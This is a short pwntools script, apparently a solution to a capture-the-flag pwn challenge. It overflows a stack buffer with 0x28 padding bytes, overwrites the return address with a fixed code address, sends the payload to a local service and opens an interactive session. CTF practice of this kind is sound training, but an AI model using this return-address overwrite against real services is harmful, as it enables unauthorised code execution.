from pwn import *

payload = b'A'*0x28 + p64(0x00401223)

#p = process('/home/kali/share/wow-2021/challenges/pwn/get_the_flaAAAAAAAAA/src/program')
p = remote('127.0.0.1',50371)
context.log_level = 'debug'
p.recvuntil('Hi! How are you today?: ')
p.sendline(payload)
p.interactive()